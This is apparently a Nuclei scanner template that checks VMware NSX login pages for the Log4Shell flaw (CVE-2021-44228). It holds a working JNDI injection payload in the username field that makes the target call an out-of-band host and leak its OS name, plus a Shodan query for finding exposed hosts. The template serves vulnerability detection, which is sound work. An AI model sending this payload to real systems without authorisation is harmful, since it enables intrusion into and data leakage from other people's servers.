id: vmware-nsx-log4j
info:
  name: VMware NSX - Remote Code Execution (Apache Log4j)
  author: DhiyaneshDK
  severity: critical
  description: VMware NSX is vulnerable to remote code execution through the Apache
    Log4j framework, which allows attackers to gain full control over a system without
    the need for valid credentials.
  reference:
  - https://kb.vmware.com/s/article/87086
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: html:"vmw_nsx_logo-black-triangle-500w.png"
    verified: 'true'
    impact: The impact of the VMware NSX vulnerability is severe as it allows attackers
      to remotely execute malicious code, access sensitive data, and take complete
      control over compromised systems without authentication.
    recommendation: I highly recommend that users of VMware NSX update their software
      immediately to address the critical vulnerability that allows remote code execution.
  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
requests:
- raw:
  - '@timeout: 20s

    POST /login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/login.jsp


    username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&submit=

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: location
    words:
    - /login.jsp?login_error=1
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
